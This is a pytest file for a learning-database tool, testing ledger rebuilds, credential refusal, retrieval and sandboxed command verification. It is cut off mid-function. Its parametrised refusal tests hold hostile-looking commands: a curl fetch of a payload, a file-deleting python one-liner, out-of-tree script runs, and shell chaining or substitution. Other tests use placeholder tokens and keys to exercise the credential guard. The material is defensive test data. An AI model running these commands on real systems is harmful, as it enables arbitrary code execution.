"""Tests for the learning database.

Four concerns. **Durability**: the ledger is the record, and the database must
be reconstructible from it exactly. **Discipline**: the guards that stop the
database filling with junk or leaking credentials must be shown to fire.
**Determinism**: retrieval and the generated views must be reproducible, because
an unreproducible retrieval cannot be calibrated. **Containment**: `verify`
executes strings that came out of a data file, so every refusal it is supposed to
make is driven here with a command that must not run.

    pytest tools/test_learn.py
"""

from __future__ import annotations

import datetime as dt
import json
import shutil
import sqlite3
from typing import TYPE_CHECKING

import pytest

import learn
from decides import decides
from discipline_core import REPO_ROOT

# Import annotation-only protocols without adding runtime dependencies.
if TYPE_CHECKING:
    from pathlib import Path


@pytest.fixture
def store(tmp_path: Path) -> learn.Store:
    """A private learning database, with this repository's schema and config.

    @param tmp_path the root the store is built under; `learning/` is created inside it
    @return a store rooted there, so no test touches the repository's own ledger

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Resolve the repository-confined path used by this operation before filesystem access.
    target = tmp_path / "learning"
    # Publish the externally visible effect after all required inputs are ready.
    target.mkdir(parents=True)
    # Normalize the current repository path to its portable baseline key spelling.
    # Advance store through the current input element in declared order.
    for name in ("schema.sql", "config.toml"):
        shutil.copy(REPO_ROOT / "learning" / name, target / name)
    # Return a store rooted there, so no test touches the repository's own ledger to the caller.
    return learn.Store(tmp_path)


def record(store: learn.Store, **overrides: object) -> str:
    """Append one learning, returning its id.

    The default payload is a minimal valid entry, so a test names only the field
    whose effect it is pinning.

    @param store the database to append to
    @param overrides payload fields to replace; `session` and `ts` additionally
        select the event's session and timestamp, which default to one fixed
        session on one fixed date so the fold stays reproducible
    @return the id the entry was allocated

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute connection using learn.sync for later record logic.
    connection = learn.sync(store)
    # Compute learning id using learn.next learning id for later record logic.
    learning_id = learn.next_learning_id(connection)
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Each payload key is a learn-event field and each value is fixture content; insertion order
    # defines stable ledger JSON.
    payload = {
        "id": learning_id,
        "kind": "diagnostic",
        "scope": "project",
        "claim": "a claim",
        "action": "do the thing",
        "evidence": "observed",
        "triggers": [{"type": "glob", "pattern": "src/**/*.py"}],
        "links": [],
        **overrides,
    }
    learn.append_event(store, "learn", overrides.pop("session", "S-1"), payload,  # type: ignore[arg-type]
                       ts=str(overrides.get("ts", "2026-08-01T00:00:00+00:00")))
    # Return the id the entry was allocated to the caller.
    return learning_id


def states(store: learn.Store) -> dict[str, str]:
    """The lifecycle status the fold assigned to each entry.

    Syncs first, so a caller sees the effect of events appended since the last
    fold without having to remember to rebuild.

    @param store the database to read
    @return every learning id mapped to its status

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute connection using learn.sync for later states logic.
    connection = learn.sync(store)
    # Each rows key is a learning id and each value is its status; mapping key order is
    # deliberately unused.
    rows = {r["id"]: r["status"] for r in connection.execute("SELECT id, status FROM learning")}
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Return every learning id mapped to its status to the caller.
    return rows


# ------------------------------------------------------------------ durability


@decides("LEARN-006")
def test_the_database_is_reconstructible_from_the_ledger(store: learn.Store) -> None:
    """The ledger is the record; the database is a query index over it.

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Compute first using record for later test the database is reconstructible from the ledger
    # Details: logic.
    first = record(store)
    learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    # Compute connection using learn.sync for later test the database is reconstructible from
    # Details: the ledger logic.
    connection = learn.sync(store)
    # Each before element is one complete learning row in lexical id order.
    before = [tuple(r) for r in connection.execute("SELECT * FROM learning ORDER BY id")]
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()

    # Publish the externally visible effect after all required inputs are ready.
    store.db.unlink()
    # Compute connection using learn.sync for later test the database is reconstructible from
    # Details: the ledger logic.
    connection = learn.sync(store)
    # Each after element is one rebuilt learning row in lexical id order.
    after = [tuple(r) for r in connection.execute("SELECT * FROM learning ORDER BY id")]
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert after == before


def test_sync_is_idempotent(store: learn.Store) -> None:
    """Folding twice yields the same rows as folding once.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store)
    # Compute connection using learn.sync for later test sync is idempotent logic.
    connection = learn.sync(store)
    # Each first element is one complete learning row in SQLite scan order.
    first = [tuple(r) for r in connection.execute("SELECT * FROM learning")]
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Compute connection using learn.sync for later test sync is idempotent logic.
    connection = learn.sync(store)
    # Each second element is one resynchronized learning row in the same SQLite scan order.
    second = [tuple(r) for r in connection.execute("SELECT * FROM learning")]
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert first == second


def test_the_ledger_is_append_only_and_line_oriented(store: learn.Store) -> None:
    """One self-contained line per event, numbered from one.

    That shape is what lets a merge conflict be resolved by keeping both sides.
    """
    record(store)
    record(store)
    # Preserve lines element values in deterministic source order.
    lines = store.ledger.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 2
    # Preserve the current decoded diagnostic line before location normalization.
    assert [json.loads(line)["seq"] for line in lines] == [1, 2]


def test_a_corrupt_ledger_line_names_itself(store: learn.Store) -> None:
    """The refusal carries file and line number, not a bare parse error.

    A hand-edited ledger is the likely cause, and the reader needs to be sent to
    the offending line rather than to the whole file.

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    record(store)
    # Compute handle using "utf-8") as handle: for later test a corrupt ledger line names itself
    # Details: logic.
    # Confine the acquired resource to this operation and release it on every exit.
    with store.ledger.open("a", encoding="utf-8") as handle:
        # Publish the externally visible effect after all required inputs are ready.
        handle.write("{not json\n")
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError, match=r"ledger\.jsonl:2"):
        learn.read_ledger(store)


# ------------------------------------------------------------------ discipline


@decides("LEARN-003")
def test_a_credential_is_refused(store: learn.Store) -> None:
    """DIAG-014 applied to the ledger: it is designed to be read widely."""
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError, match="credential"):
        learn.append_event(
            store, "learn", "S-1",
            {"id": "L-0001", "claim": "token=ghp_abcdefghijklmnopqrstuvwxyz0123"},
        )
    assert not store.ledger.exists()


@pytest.mark.parametrize(
    "secret",
    [
        "AKIAIOSFODNN7EXAMPLE",
        "-----BEGIN RSA PRIVATE KEY-----",
        "password: hunter2000",
        "/home/someone/private/",
    ],
)
def test_each_secret_shape_is_refused(store: learn.Store, secret: str) -> None:
    """Four differently-shaped secrets are refused, not only the token form above.

    An AWS key id, a private key header, a key/value credential and a home
    directory path each trip a separate pattern, so the guard is shown to be a
    family of shapes rather than one regex.
    """
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError):
        learn.append_event(store, "learn", "S-1", {"claim": secret})


def test_a_learning_without_a_trigger_can_never_be_found(store: learn.Store) -> None:
    """Guarded at the CLI, because such an entry is invisible by construction."""
    # Compute config using store.config for later test a learning without a trigger can never be
    # Details: found logic.
    config = store.config()
    assert config["write"]["require_trigger"] is True


@pytest.mark.parametrize("omitted", ["--claim", "--action"])
def test_record_refuses_a_missing_claim_or_action(
    store: learn.Store,
    omitted: str,
) -> None:
    """The CLI rejects either required half before touching the ledger.

    @param store isolated learning store
    @param omitted required option removed from the otherwise complete invocation
    """
    # Each arguments element is one process argument string; invocation order is preserved.
    arguments = [
        "--root", str(store.root), "record", "--kind", "diagnostic",
        "--claim", "the parser failed", "--action", "inspect the input",
        "--trigger", "rule:LEARN-002",
    ]
    # Locate the structural boundary used to parse the external result safely.
    position = arguments.index(omitted)
    # Carry out this operation at its documented position in the semantic sequence.
    del arguments[position:position + 2]
    # Bind stopped to the current value used by the next test record refuses a missing claim or
    # Details: action decision.
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(SystemExit) as stopped:
        learn.main(arguments)
    assert stopped.value.code == 2
    assert not store.ledger.exists()


def test_record_refuses_a_missing_trigger(store: learn.Store) -> None:
    """A write-only learning is refused and leaves no event behind.

    @param store isolated learning store
    """
    # Capture status as the completed test record refuses a missing trigger outcome for
    # Details: subsequent validation or publication.
    status = learn.main([
        "--root", str(store.root), "record", "--kind", "diagnostic",
        "--claim", "the parser failed", "--action", "inspect the input",
    ])
    assert status == 1
    assert not store.ledger.exists()


def test_record_command_refuses_a_credential(store: learn.Store) -> None:
    """The public tool path applies the credential guard before append.

    @param store isolated learning store
    """
    # Capture status as the completed test record command refuses a credential outcome for
    # Details: subsequent validation or publication.
    status = learn.main([
        "--root", str(store.root), "record", "--kind", "diagnostic",
        "--claim", "token=ghp_abcdefghijklmnopqrstuvwxyz0123",
        "--action", "redact it", "--trigger", "rule:LEARN-003",
    ])
    assert status == 1
    assert not store.ledger.exists()


def test_an_unknown_trigger_type_is_rejected() -> None:
    """A misspelled type is refused with the valid ones named in the message.

    The accepting half is pinned too: a valid argument splits at the first colon
    into the two-field form the payload stores.
    """
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError, match="trigger must be one of"):
        learn.parse_trigger("nonsense:whatever")
    assert learn.parse_trigger("glob:src/**") == {"type": "glob", "pattern": "src/**"}


# ------------------------------------------------------------------- retrieval


def test_a_glob_trigger_matches_a_path(store: learn.Store) -> None:
    """The candidate carries the pattern that surfaced it.

    Retrieval that cannot say why it offered something cannot be reviewed.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, triggers=[{"type": "glob", "pattern": "src/**/adapters/*.py"}])
    # Compute connection using learn.sync for later test a glob trigger matches a path logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/pkg/adapters/fs.py",
                           today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Select c as the current element from found] == ["L-0001"] while test a glob trigger
    # Details: matches a path preserves traversal order.
    assert [c.id for c in found] == ["L-0001"]
    assert found[0].matched == ("path ~ src/**/adapters/*.py",)


def test_an_error_signature_ignores_separator_style(store: learn.Store) -> None:
    """Hyphens, underscores and spaces are one signature.

    A failure line is pasted in whatever form the emitting tool chose, and a
    learning recorded against one spelling must still be found from another.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, triggers=[{"type": "error", "pattern": "adapters are independent"}])
    # Compute connection using learn.sync for later test an error signature ignores separator
    # Details: style logic.
    connection = learn.sync(store)
    # Retain the immutable source representation consumed by subsequent analysis.
    # Advance test an error signature ignores separator style through the current input element
    # Details: in declared order.
    for text in ("contract adapters-are-independent FAILED",
                 "adapters_are_independent broke"):
        # Preserve the optional pattern match that carries the reported analysis count.
        found = learn.retrieve(store, connection, error=text, today=dt.date(2026, 8, 1))
        # Select c as the current element from found] == ["L-0001"], text while test an error
        # Details: signature ignores separator style preserves traversal order.
        assert [c.id for c in found] == ["L-0001"], text
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()


def test_a_rule_trigger_matches_a_selected_rule(store: learn.Store) -> None:
    """A rule id in the caller's reading plan is enough; no error text is needed.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, triggers=[{"type": "rule", "pattern": "ARCH-003"}])
    # Compute connection using learn.sync for later test a rule trigger matches a selected rule
    # Details: logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, rules=["ARCH-003"], today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Select c as the current element from found] == ["L-0001"] while test a rule trigger
    # Details: matches a selected rule preserves traversal order.
    assert [c.id for c in found] == ["L-0001"]


def test_nothing_matches_an_unrelated_situation(store: learn.Store) -> None:
    """Retrieval stays empty rather than offering the nearest entry it has.

    A near miss presented as advice is worse than silence: it spends context and
    trains the reader to stop believing the output.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, triggers=[{"type": "glob", "pattern": "docs/**"}])
    # Compute connection using learn.sync for later test nothing matches an unrelated situation
    # Details: logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/pkg/domain/x.py",
                           today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert found == []


@decides("LEARN-007")
def test_retrieval_is_reproducible(store: learn.Store) -> None:
    """The same query returns the same candidates in the same order.

    Ordering is part of the result: entries tied on confidence are broken by id,
    so nothing depends on how the rows happened to come back.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Locate the structural boundary used to parse the external result safely.
    # Advance test retrieval is reproducible through the current input element in declared
    # Details: order.
    for index in range(3):
        record(store, learning_id=f"L-{index + 1:04d}")
    # Compute connection using learn.sync for later test retrieval is reproducible logic.
    connection = learn.sync(store)
    # Compute first using learn.retrieve for later test retrieval is reproducible logic.
    first = learn.retrieve(
        store, connection, file="src/pkg/a.py", today=dt.date(2026, 8, 1)
    )
    # Compute second using learn.retrieve for later test retrieval is reproducible logic.
    second = learn.retrieve(
        store, connection, file="src/pkg/a.py", today=dt.date(2026, 8, 1)
    )
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert len(first) == 3, "the determinism comparison must not run over an empty answer"
    assert first == second


def test_retrieval_respects_the_budget(store: learn.Store) -> None:
    """Matching entries are dropped once the token budget is spent.

    The ceiling is approximate rather than hard -- the first candidate is always
    kept, so one oversized entry can exceed it alone.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Advance test retrieval respects the budget through the current input element in declared
    # Details: order.
    for _ in range(6):
        record(store, claim="a long claim " * 40, action="a long action " * 40)
    # Compute connection using learn.sync for later test retrieval respects the budget logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/a.py", today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Compute budget using store.config for later test retrieval respects the budget logic.
    budget = store.config()["retrieval"]["budget_tokens"]
    assert len(found) < 6, "nothing was dropped despite each entry being large"
    # Select c as the current element from found) // 4 <= budget * 1.5 while test retrieval
    # Details: respects the budget preserves traversal order.
    assert sum(len(c.render()) for c in found) // 4 <= budget * 1.5


def test_retrieval_has_a_machine_readable_form(capsys: pytest.CaptureFixture[str],
                                               store: learn.Store) -> None:
    """`--json` prints the candidates as data, for a caller that is not a person.

    Pinned because the candidates are slotted dataclasses: an instance dictionary
    is exactly what they do not have, so serialising them the obvious way raises
    only once something actually matched, which is the worst time to find out.
    """
    # Stamped now, and matched against a path with the depth the default trigger
    # asks for: the subcommand reads the system date, so an entry dated in the
    # fixture's past would decay out of the answer as the calendar moves.
    record(store, ts=learn.now_iso())
    assert learn.main(["--root", str(store.root), "retrieve",
                       "--file", "src/pkg/a.py", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)[0]["id"] == "L-0001"


def test_a_retired_learning_is_not_offered(store: learn.Store) -> None:
    """Refuted entries stay in the log for audit, not for advice.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test a retired learning is not offered logic.
    first = record(store)
    learn.append_event(store, "refute", "S-2", {"ref": first, "why": "wrong here"})
    # Compute connection using learn.sync for later test a retired learning is not offered
    # Details: logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/a.py", today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert found == []
    assert states(store)[first] == "refuted"


@decides("LEARN-008")
def test_confidence_decays_with_time(store: learn.Store) -> None:
    """Confidence halves once per half-life since the entry was last seen.

    Pinned at zero days and at exactly one half-life -- 90 days for a diagnostic,
    the fastest-rotting kind -- which is the pair that fixes both the starting
    value and the rate.
    """
    # Compute config using store.config for later test confidence decays with time logic.
    config = store.config()
    # Compute fresh using learn.effective confidence for later test confidence decays with time
    # Details: logic.
    fresh = learn.effective_confidence(0.5, "2026-08-01T00:00:00+00:00", "diagnostic",
                                       config, dt.date(2026, 8, 1))
    # Compute one half life using learn.effective confidence for later test confidence decays
    # Details: with time logic.
    one_half_life = learn.effective_confidence(0.5, "2026-08-01T00:00:00+00:00",
                                               "diagnostic", config, dt.date(2026, 10, 30))
    assert fresh == 0.5
    assert one_half_life == pytest.approx(0.25, abs=0.01)


def test_a_decayed_learning_falls_below_the_floor(store: learn.Store) -> None:
    """An entry untouched for years stops being offered.

    Nothing retires it: decay alone carries it under the retrieval threshold, so
    a database nobody prunes still shrinks what it proposes.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store)
    # Compute connection using learn.sync for later test a decayed learning falls below the
    # Details: floor logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/a.py", today=dt.date(2030, 1, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert found == [], "an entry untouched for years should stop being offered"


# ------------------------------------------------------------------- lifecycle


def test_a_candidate_becomes_active_on_evidence(store: learn.Store) -> None:
    """A new entry starts as a candidate and is promoted only by reported use.

    Two helped outcomes from two sessions clear the unverified threshold.
    """
    # Compute first using record for later test a candidate becomes active on evidence logic.
    first = record(store)
    assert states(store)[first] == "candidate"
    learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    learn.append_event(store, "use", "S-3", {"ref": first, "outcome": "helped"})
    assert states(store)[first] == "active"


def test_one_session_repeated_is_not_two_observations(store: learn.Store) -> None:
    """min_sessions exists because three outcomes in one session is one datum."""
    # Compute first using record for later test one session repeated is not two observations
    # Details: logic.
    first = record(store)
    # Advance test one session repeated is not two observations through the current input
    # Details: element in declared order.
    for _ in range(3):
        learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    assert states(store)[first] == "candidate"


def test_a_verified_learning_needs_less_evidence(store: learn.Store) -> None:
    """The check is the evidence -- the axiom, applied to learnings."""
    # Compute first using record for later test a verified learning needs less evidence logic.
    first = record(store, verification="pytest -k contract")
    learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    assert states(store)[first] == "active"


def test_noise_lowers_confidence_more_than_help_raises_it(store: learn.Store) -> None:
    """One help and one complaint leave the entry below where it started.

    The asymmetry is deliberate: an entry that wastes a reader's attention should
    fall out faster than it climbed in.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test noise lowers confidence more than help raises it
    # Details: logic.
    first = record(store)
    learn.append_event(store, "use", "S-2", {"ref": first, "outcome": "helped"})
    learn.append_event(store, "use", "S-3", {"ref": first, "outcome": "noise"})
    # Compute connection using learn.sync for later test noise lowers confidence more than help
    # Details: raises it logic.
    connection = learn.sync(store)
    # Compute row using connection.execute for later test noise lowers confidence more than help
    # Details: raises it logic.
    row = connection.execute("SELECT confidence FROM learning WHERE id = ?", (first,)).fetchone()
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert row["confidence"] < 0.5


def test_promotion_retires_a_learning(store: learn.Store) -> None:
    """A learning that became a mechanism stops competing for attention.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test promotion retires a learning logic.
    first = record(store)
    learn.append_event(store, "promote", "S-2",
                       {"ref": first, "mechanism": "check:whatever"})
    assert states(store)[first] == "promoted"
    # Compute connection using learn.sync for later test promotion retires a learning logic.
    connection = learn.sync(store)
    # Preserve the optional pattern match that carries the reported analysis count.
    found = learn.retrieve(store, connection, file="src/a.py", today=dt.date(2026, 8, 1))
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert found == []


def test_supersession_points_at_the_replacement(store: learn.Store) -> None:
    """The retired entry records which one replaced it, so an old citation leads on.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Compute first using record for later test supersession points at the replacement logic.
    first = record(store)
    # Compute second using record for later test supersession points at the replacement logic.
    second = record(store)
    learn.append_event(store, "supersede", "S-2", {"ref": first, "by": second})
    # Compute connection using learn.sync for later test supersession points at the replacement
    # Details: logic.
    connection = learn.sync(store)
    # Compute row using connection.execute for later test supersession points at the replacement
    # Details: logic.
    row = connection.execute(
        "SELECT status, superseded_by FROM learning WHERE id = ?", (first,)
    ).fetchone()
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert (row["status"], row["superseded_by"]) == ("superseded", second)


def test_an_outcome_for_an_unknown_learning_is_ignored(store: learn.Store) -> None:
    """An event about an id that was never recorded folds to nothing.

    The event stays in the ledger; what it must not do is conjure a row, because
    the fold has to survive a ledger merged from two branches.
    """
    learn.append_event(store, "use", "S-1", {"ref": "L-9999", "outcome": "helped"})
    assert states(store) == {}


# ----------------------------------------------------------------- verification


def script(store: learn.Store, name: str, body: str) -> str:
    """Write a one-line program into the store's root and name the command that runs it.

    The store's root is the working directory a verification runs in, so a bare
    relative name is what the allowlist sees and what the interpreter finds.

    @param store the store whose root the program is written into
    @param name the file to write, which must end in the Python suffix to be admitted
    @param body the program text
    @return the command a learning would record to run it

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Publish the externally visible effect after all required inputs are ready.
    (store.root / name).write_text(body, encoding="utf-8")
    # Return the command a learning would record to run it to the caller.
    return f"python {name}"


def verified(store: learn.Store, command: str) -> list[learn.VerifyResult]:
    """Record one learning carrying `command` and run the verification pass over it.

    @param store the database to record into
    @param command the verification command to attach
    @return the results, one per live entry carrying a command

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    record(store, verification=command)
    # Compute connection using learn.sync for later verified logic.
    connection = learn.sync(store)
    # Compute results using learn.verify for later verified logic.
    results = learn.verify(store, connection, execute=True, timeout=20)
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Return the results, one per live entry carrying a command to the caller.
    return results


def test_a_dry_run_starts_nothing(store: learn.Store) -> None:
    """The default reports what would run, and runs none of it.

    The proof is a side effect: the program writes a file, and after a dry run
    that file must not exist. Executing by default would make a ledger arriving
    from another repository into a way to run code here.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "ran.py", "open('sentinel', 'w').write('x')\n")
    record(store, verification=command)
    # Compute connection using learn.sync for later test a dry run starts nothing logic.
    connection = learn.sync(store)
    # Compute results using learn.verify for later test a dry run starts nothing logic.
    results = learn.verify(store, connection)
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    # Select r as the current element from results] == ["skipped"] while test a dry run starts
    # Details: nothing preserves traversal order.
    assert [r.outcome for r in results] == ["skipped"]
    assert not (store.root / "sentinel").exists()
    assert "would run" in results[0].detail


def test_an_executed_verification_carries_its_exit_status(store: learn.Store) -> None:
    """With the opt-in flag the command runs, and a clean exit reads as passed."""
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "ok.py", "open('sentinel', 'w').write('x')\n")
    # Compute results using verified for later test an executed verification carries its exit
    # Details: status logic.
    results = verified(store, command)
    # Select r as the current element from results] == [("passed", 0)] while test an executed
    # Details: verification carries its exit status preserves traversal order.
    assert [(r.outcome, r.code) for r in results] == [("passed", 0)]
    assert (store.root / "sentinel").exists()


def test_a_failing_verification_is_data_not_a_crash(store: learn.Store) -> None:
    """A command that exits non-zero is reported, with its status and its last output line.

    This is the whole point of the subcommand: the failure is the measurement, so
    it must never propagate as an exception.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "bad.py", "import sys\nprint('the claim moved')\nsys.exit(3)\n")
    # Compute results using verified for later test a failing verification is data not a crash
    # Details: logic.
    results = verified(store, command)
    # Select r as the current element from results] == [("failed", 3)] while test a failing
    # Details: verification is data not a crash preserves traversal order.
    assert [(r.outcome, r.code) for r in results] == [("failed", 3)]
    assert "the claim moved" in results[0].detail


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/payload",
        'python -c "import os; os.remove(\'x\')"',
        "python -",
        "python",
        "sh -c ls",
        "/usr/bin/python evil.py",
        "./python evil.py",
        "python ../outside.py",
        "python -m os",
        "python -m subprocess",
        "pytest ../next-door/test_x.py",
        "python -m pytest ../next-door",
        "doxygen ../next-door/Doxyfile",
        "ruff check --config=../next-door/ruff.toml .",
        "pytest ..",
    ],
)
def test_a_command_outside_the_allowlist_is_refused(store: learn.Store,
                                                    command: str) -> None:
    """Fifteen shapes an untrusted ledger would use are each refused, by name.

    A ledger can arrive from another repository through `vendor` and `harvest`,
    so this is the proof-of-failure companion the allowlist needs (FLOW-007): an
    arbitrary program, an interpreter carrying its own program, a path-qualified
    executable, a script outside the tree, a module reaching the standard
    library, and an argument pointing out of the tree at a file the admitted
    program would then execute. The refusal has to name what it refused; a silent
    skip would leave the reader believing the entry verified.
    """
    # Compute results using verified for later test a command outside the allowlist is refused
    # Details: logic.
    results = verified(store, command)
    # Select r as the current element from results] == ["refused"], results[0].detail while test
    # Details: a command outside the allowlist is refused preserves traversal order.
    assert [r.outcome for r in results] == ["refused"], results[0].detail
    assert results[0].command == command
    assert results[0].detail


def test_a_refusal_is_reported_rather_than_run(store: learn.Store) -> None:
    """The refused command's side effect must not have happened.

    Checking the outcome word alone would pass even if the command had run and
    then been labelled refused, so the file the program would have written is
    what is actually asserted.

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Publish the externally visible effect after all required inputs are ready.
    (store.root / "evil.py").write_text("open('breach', 'w').write('x')\n", encoding="utf-8")
    # Compute results using verified for later test a refusal is reported rather than run logic.
    results = verified(store, "/usr/bin/python evil.py")
    assert results[0].outcome == "refused"
    assert not (store.root / "breach").exists()


def test_an_admitted_program_may_not_be_pointed_out_of_the_tree(store: learn.Store) -> None:
    """A neighbouring directory is where a harvested ledger's own repository sits.

    `pytest` is on the allowlist and will execute any file it is given, so
    bounding the entry point alone left `pytest ../next-door/test_x.py` running
    code from outside the tree and reporting it as passed. The sentinel is
    written outside the store, which is the only assertion that separates a
    refusal from a run that was merely labelled one.

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Compute neighbour using store.root.parent / "next-door" for later test an admitted program
    # Details: may not be pointed out of the tree logic.
    neighbour = store.root.parent / "next-door"
    # Publish the externally visible effect after all required inputs are ready.
    neighbour.mkdir(exist_ok=True)
    # Compute breach using store.root.parent / "breach" for later test an admitted program may
    # Details: not be pointed out of the tree logic.
    breach = store.root.parent / "breach"
    # Publish the externally visible effect after all required inputs are ready.
    (neighbour / "test_evil.py").write_text(
        f"open({str(breach)!r}, 'w').write('x')\ndef test_ok() -> None:\n    pass\n",
        encoding="utf-8",
    )
    # Compute results using verified for later test an admitted program may not be pointed out
    # Details: of the tree logic.
    results = verified(store, "pytest ../next-door/test_evil.py")
    assert results[0].outcome == "refused", results[0].detail
    assert "outside the repository" in results[0].detail
    assert not breach.exists()


@pytest.mark.parametrize(
    "command",
    [
        "ruff check",
        "ruff check --config=ruff.toml .",
        "python tools/build_graph.py --check",
        "python -m pytest enforce/checks/test_doc_checks.py -q",
        "doxygen enforce/Doxyfile",
        "pytest -p no:cacheprovider tools",
    ],
)
def test_an_ordinary_in_tree_command_is_still_admitted(store: learn.Store,
                                                       command: str) -> None:
    """The path bound must not refuse the commands the ledger actually carries.

    Every one of these is a shape recorded in this repository's own ledger or a
    near neighbour of one. A guard that refuses them would take the staleness
    signal away from every honest entry to stop a dishonest one, which is the
    trade this check exists to catch.
    """
    # Compute argv using learn.verification argv for later test an ordinary in tree command is
    # Details: still admitted logic.
    argv = learn.verification_argv(command)
    assert learn.verification_refusal(argv, store.root) is None


def test_no_shell_ever_sees_the_command(store: learn.Store) -> None:
    """Shell syntax in the ledger arrives as a literal argument, not as syntax.

    The command chains a second program with `&&`. Parsed rather than passed to a
    shell, the chain becomes two more arguments to the first program, so the
    second never starts -- which is what the sentinel file proves.

    @par Effects
    Creates, replaces, or removes repository artifacts in implementation order.
    """
    # Compute first using script for later test no shell ever sees the command logic.
    first = script(store, "first.py", "open('first-ran', 'w').write('x')\n")
    # Publish the externally visible effect after all required inputs are ready.
    (store.root / "second.py").write_text("open('breach', 'w').write('x')\n", encoding="utf-8")
    # Compute results using verified for later test no shell ever sees the command logic.
    results = verified(store, f"{first} && python second.py")
    assert results[0].outcome == "passed"
    assert (store.root / "first-ran").exists()
    assert not (store.root / "breach").exists()
    assert learn.verification_argv("python a.py $(whoami) | tee out") == [
        "python", "a.py", "$(whoami)", "|", "tee", "out",
    ]


def test_unbalanced_quoting_is_refused_not_guessed(store: learn.Store) -> None:
    """A command that will not parse is refused, rather than split on whitespace."""
    # Confine the acquired resource to this operation and release it on every exit.
    with pytest.raises(learn.LearnError, match="cannot be parsed"):
        learn.verification_argv('python "unclosed.py')
    # Compute results using verified for later test unbalanced quoting is refused not guessed
    # Details: logic.
    results = verified(store, 'python "unclosed.py')
    assert results[0].outcome == "refused"


def test_a_verification_that_never_ends_is_killed(store: learn.Store) -> None:
    """A hung command is bounded, and the timeout is not a refutation.

    A report that can hang is a report nobody runs unattended, and a machine that
    was merely slow has said nothing about whether the claim still holds.

    @par Effects
    May mutate caller-visible or process-local state in implementation order.
    """
    # Preserve the external command representation and its observed completion outcome.
    command = script(store, "hang.py", "import time\ntime.sleep(30)\n")
    record(store, verification=command)
    # Compute connection using learn.sync for later test a verification that never ends is
    # Details: killed logic.
    connection = learn.sync(store)
    # Compute results using learn.verify for later test a verification that never ends is killed
    # Details: logic.
    results = learn.verify(store, connection, execute=True, timeout=1)
    # Publish the externally visible effect after all required inputs are ready.
    connection.close()
    assert results[0].outcome == "timeout"
    assert learn.refute_failures(store, results, "S-9") == []


def test_a_retired_learning_is_not_verified(store: learn.Store) -> None:
